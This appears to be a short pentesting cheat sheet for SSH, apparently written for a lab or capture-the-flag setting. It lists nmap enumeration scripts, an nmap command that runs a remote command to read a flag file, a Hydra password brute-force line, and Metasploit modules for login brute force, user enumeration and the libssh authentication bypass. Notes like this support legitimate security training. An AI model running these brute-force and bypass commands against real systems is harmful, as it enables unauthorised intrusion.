
Fetch banner with netcat
```bash
nc $IP 22
```

Enumerate algorithms
```bash
nmap --script ssh2-enum-algos 192.201.39.3
```

Get host key
```bash
nmap --script ssh-hostkey --script-args ssh_hostkey=full $IP
```

Auth methods
```bash
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
```

```bash
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
```

Running commands via nmap:
```bash
nmap --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student, ssh-run.password=" $IP
```
## Hydra Brute Force

```bash
hydra -L <wordlist> -P <password list> -t 4 $IP ssh
```

## metasploit

Brute force login
```bash
auxiliary/scanner/ssh/ssh_login
```

User enumeration
```bash
auxiliary/scanner/ssh/ssh_enumusers
```

Get shell on certain versions ssh v2
```bash
auxiliary/scanner/ssh/libssh_auth_bypass
```

